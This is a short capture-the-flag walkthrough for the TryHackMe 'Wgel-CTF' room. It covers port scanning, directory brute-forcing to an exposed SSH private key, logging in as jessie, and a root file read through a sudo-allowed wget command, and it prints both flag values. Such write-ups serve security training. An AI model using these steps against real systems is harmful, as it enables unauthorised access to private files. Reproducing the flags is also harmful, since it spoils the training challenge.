# Wgel-CTF
https://tryhackme.com/room/wgelctf

**Use nmap to scan for open ports: sudo nmap 10.10.252.80**  

	PORT   STATE SERVICE

	22/tcp open  ssh

	80/tcp open  http


Head to the website and inspect to get a clue:

	 <!-- Jessie don't forget to udate the webiste -->
	*jessie could be a potential name for the ssh server*

**Usedirb http://10.10.252.80 to find directories**
	DIRECTORY: http://10.10.252.80/sitemap/.ssh/ 
	* *This directory leads to a RSA key* *

Copy th RSA key and create a file

chmod 600 for file

ssh -i [rsa file] jessie@10.10.252.80 

Access is gained!

cd to Documents and cat user_flag.txt to get the first flag

~~057c67131c3d5e42dd5cd3075b198ff6~~ 

**sudo -l to see what permissions are allowed:**

	User jessie may run the following commands on CorpOne:

    (ALL : ALL) ALL

    (root) NOPASSWD: /usr/bin/wget


**Head to https://gtfobins.github.io/gtfobins/wget/**

Let's use the file read code:

	LFILE=/root/root_flag.txt *since user-flag.txt*

	wget -i $LFILE
	
Once excutued it will show a flag:

~~b1b968b37519ad1daa6408188649263d~~ 
